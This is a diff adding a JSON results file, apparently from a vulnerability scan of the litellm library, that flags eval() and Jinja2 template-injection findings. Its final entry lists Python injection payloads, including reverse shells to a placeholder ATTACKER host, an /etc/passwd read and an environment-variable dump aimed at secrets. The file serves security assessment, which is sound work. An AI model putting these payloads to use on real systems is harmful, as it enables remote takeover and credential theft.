@@ -1,0 +1,68 @@
+[
+  {
+    "name": "template_injection",
+    "description": "Template string injection leading to eval()",
+    "vulnerable": true,
+    "details": "Found eval() in litellm/utils.py",
+    "error": null
+  },
+  {
+    "name": "callback_rce",
+    "description": "Custom callback handler code execution",
+    "vulnerable": false,
+    "details": "Found custom logger callback handler (check version)",
+    "error": null
+  },
+  {
+    "name": "proxy_config_injection",
+    "description": "Proxy server configuration injection",
+    "vulnerable": true,
+    "details": "Found eval() in proxy files: ui_sso.py, pass_through_endpoints.py",
+    "error": null
+  },
+  {
+    "name": "response_parsing_rce",
+    "description": "Unsafe model response parsing",
+    "vulnerable": false,
+    "details": null,
+    "error": null
+  },
+  {
+    "name": "ssti_vulnerability",
+    "description": "Server-Side Template Injection (SSTI) - CVE in < 1.34.42",
+    "vulnerable": true,
+    "details": "Unsandboxed Jinja2 template in arize_phoenix_prompt_manager.py",
+    "error": null
+  },
+  {
+    "name": "payload_demonstration",
+    "description": "Example RCE payload patterns (demonstration only)",
+    "payloads": [
+      {
+        "name": "OS Command Execution",
+        "payload": "__import__('os').system('id')",
+        "description": "Execute system command via os.system"
+      },
+      {
+        "name": "Reverse Shell",
+        "payload": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"')",
+        "description": "Spawn reverse shell to attacker"
+      },
+      {
+        "name": "File Read",
+        "payload": "__import__('builtins').open('/etc/passwd').read()",
+        "description": "Read arbitrary files"
+      },
+      {
+        "name": "Environment Exfiltration",
+        "payload": "str(__import__('os').environ)",
+        "description": "Extract environment variables (API keys, secrets)"
+      },
+      {
+        "name": "Python Code Execution",
+        "payload": "exec('import socket,subprocess;s=socket.socket();s.connect((\"attacker\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())')",
+        "description": "Execute arbitrary Python code"
+      }
+    ]
+  }
+]
